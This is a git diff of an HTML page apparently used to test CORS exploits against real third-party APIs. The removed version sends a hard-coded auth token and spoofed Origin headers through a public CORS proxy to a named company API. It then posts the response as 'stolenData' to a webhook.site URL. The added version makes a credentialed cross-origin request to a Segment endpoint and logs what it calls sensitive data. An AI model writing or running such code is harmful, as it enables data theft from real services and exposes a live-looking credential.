@@ -1,67 +1,19 @@
-<!DOCTYPE html>
 <html>
-<head>
-    <title>CORS Exploit Test</title>
+  <body>
     <script>
-        console.log("CORS Exploit Test script loaded and running...");
-
-        // Define the proxy URL and target endpoint
-        const proxyURL = "https://cors-anywhere.herokuapp.com/"; // Replace with your own proxy if needed
-        const targetURL = "https://api.company-target.com/api/v3/ip.json";
-        const webhookURL = "https://webhook.site/90a9a04b-72c9-4653-a2c2-f0a66c64559c";
-
-        async function fetchDataAndForward() {
-            try {
-                // Step 1: Fetch data from the target URL via proxy
-                const response = await fetch(proxyURL + targetURL, {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json",
-                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
-                        "Referer": "https://varad4-0-4.github.io",
-                        "Origin": "https://varad4-0-4.github.io"
-                    },
-                    body: JSON.stringify({
-                        src: "tag",
-                        auth: "mHlqHytbs5xRhLbSvPSKl4PqNQJrYCYgov6cXimN"
-                    })
-                });
-
-                if (!response.ok) {
-                    throw new Error(`Target fetch failed: ${response.status} ${response.statusText}`);
-                }
-
-                const data = await response.json();
-                console.log("Data retrieved from target:", data);
-
-                // Step 2: Send the extracted data to the Webhook
-                const webhookResponse = await fetch(webhookURL, {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify({ stolenData: data })
-                });
-
-                if (!webhookResponse.ok) {
-                    throw new Error(`Webhook send failed: ${webhookResponse.status} ${webhookResponse.statusText}`);
-                }
-
-                console.log("Data successfully sent to Webhook.site");
-
-            } catch (err) {
-                console.error("Error occurred:", err);
-            }
+      fetch("https://api.segment.io/v1/p", {
+        method: "GET",
+        credentials: "include", // Includes cookies
+        headers: {
+          "Origin": "https://varad4-0-4.github.io/covid19partnersplatform-dev/"
         }
-
-        // Run the function to start the exploit
-        fetchDataAndForward();
+      })
+      .then(response => response.text())
+      .then(data => {
+        console.log(data); // Logs sensitive data
+      });
     </script>
-</head>
-<body>
-    <h1>CORS Exploit Test</h1>
-    <p>Check the browser console and Webhook.site for results.</p>
-</body>
+  </body>
 </html>
 
 
